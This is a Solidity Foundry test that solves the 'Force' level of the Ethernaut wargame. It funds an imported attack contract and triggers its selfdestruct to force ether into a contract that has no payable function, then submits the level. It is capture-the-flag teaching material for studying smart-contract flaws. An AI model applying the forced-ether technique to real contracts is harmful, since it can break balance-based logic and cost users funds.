// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// testing functionalities
import "forge-std/Test.sol";

// Ethernaut game components
import "src/core/Ethernaut.sol";
import "src/levels/07-Force/ForceFactory.sol";
import "src/levels/07-Force/ForceAttack.sol";

contract ForceTest is Test {
    /*//////////////////////////////////////////////////////////////
                            GAME INSTANCE SETUP
    //////////////////////////////////////////////////////////////*/

    Ethernaut ethernaut;

    /// @dev eve is the attacker
    address eve = makeNameForAddress("eve");

    function setUp() public {
        emit log_string("Setting up Force level...");
        ethernaut = new Ethernaut();
    }

    /*//////////////////////////////////////////////////////////////
                LEVEL INSTANCE -> EXPLOIT -> SUBMISSION
    //////////////////////////////////////////////////////////////*/

    function test_ForceExploit() public {
        /*//////////////////////////////////////////////////////////////
                            LEVEL INSTANCE SETUP
        //////////////////////////////////////////////////////////////*/

        ForceFactory forceFactory = new ForceFactory();

        ethernaut.registerLevel(forceFactory);
        vm.startPrank(eve);

        address levelAddress = ethernaut.createLevelInstance(forceFactory);
        Force forceContract = Force(levelAddress);

        emit log_named_uint("Initial Force contract's balance: ", address(forceContract).balance);
        emit log_named_address("Force contract address: ", address(forceContract));

        // 1st step - attack contract deployment
        ForceAttack forceAttack = new ForceAttack(address(forceContract));

        /*//////////////////////////////////////////////////////////////
                                LEVEL EXPLOIT
        //////////////////////////////////////////////////////////////*/

        emit log_string("Starting the exploit... 🧨");

        // 2nd step - funding the attack contract
        emit log_string("Funding the Attack contract with 1 eth");
        vm.deal(address(forceAttack), 1 ether);
        emit log_named_uint("The balance of the Attack contract: ", address(forceAttack).balance);

        // 3rd step - triggering selfdestruct
        emit log_string("Destroying the Attack contract...");
        forceAttack.attackForceContract();
        emit log_string("Attack contract destroyed ☠️");
        emit log_named_address("Funds transferred to: ", address(forceContract));

        emit log_named_uint("The balance of the Force contract: ", address(forceContract).balance);

        /*//////////////////////////////////////////////////////////////
                                LEVEL SUBMISSION
        //////////////////////////////////////////////////////////////*/

        bool challengeCompleted = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(challengeCompleted);
    }

    /*//////////////////////////////////////////////////////////////
                            HELPER FUNCTIONS
    //////////////////////////////////////////////////////////////*/

    /**
     * I've found this useful function
     * in github/twpony Ethernaut repo
     * @notice This function allows for creating labels (names) for addresses
     * which will improve readability in traces
     * @param name you pass the name like "alice" or "bob" and it will create
     * an address for that person
     */
    function makeNameForAddress(string memory name) public returns (address) {
        address addr = address(uint160(uint256(keccak256(abi.encodePacked(name)))));
        vm.label(addr, name);
        return addr;
    }
}
